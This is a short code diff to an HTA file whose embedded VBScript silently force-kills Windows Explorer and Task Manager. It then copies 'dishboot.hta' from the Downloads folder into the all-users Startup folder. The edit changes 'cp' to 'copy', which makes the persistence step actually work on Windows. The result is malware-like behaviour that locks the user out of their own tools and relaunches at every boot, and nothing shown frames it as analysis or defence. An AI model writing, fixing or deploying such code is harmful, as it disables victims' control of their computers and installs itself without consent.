@@ -32,7 +32,7 @@ img {
     Set shell = CreateObject("WScript.Shell")
     shell.Run "taskkill /f /im explorer.exe", 0, True
     shell.Run "taskkill /f /im taskmgr.exe", 0, True
-    shell.Run "cp %USERPROFILE%\Downloads\dishboot.hta %programdata%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
+    shell.Run "copy %USERPROFILE%\Downloads\dishboot.hta %programdata%\Microsoft\Windows\Start Menu\Programs\Startup", 0, True
   </script>
 <script language="javascript">
 try {
